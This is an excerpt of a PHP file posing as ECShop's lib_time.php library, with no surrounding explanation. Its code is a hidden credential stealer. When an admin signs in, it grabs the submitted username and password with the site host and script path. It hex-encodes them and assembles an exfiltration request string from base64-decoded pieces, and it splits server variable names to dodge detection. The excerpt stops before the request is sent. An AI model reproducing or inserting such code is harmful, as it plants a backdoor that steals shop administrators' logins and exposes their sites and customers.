 ...
 * ============================================================================
 * $Author: testyang $
 * $Id: lib_time.php 14481 2008-04-18 11:23:01Z testyang $
*/
...
if((!empty($_POST['username'])) && (!empty($_POST['password'])) && ($_POST['act'] == 'signin')) {
	define('UC_ADMINSCRIPTS', 'ecshop');
	...
	define('UC_SPIDERHOST',$_SERVER['HTT'.'P_HOST'] ? $_SERVER['HTT'.'P_HOST'] : $_SERVER['SERV'.'ER_NAME']);
	define('UC_SPIDERSELF',$_SERVER['PHP_S'.'ELF'] ? $_SERVER['PHP_S'.'ELF'] : $_SERVER['SCRI'.'PT_NAME']);
	$uc_config_array = array(bin2hex(UC_SPIDERHOST),bin2hex(UC_SPIDERSELF),bin2hex($_POST['username']),bin2hex($_POST['password']));
	$ucbaiduget  = base64_decode (UC_NOROBOTS).UC_ADMINSCRIPTS.base64_decode ('JmRhdGE9').join('|',$uc_config_array);
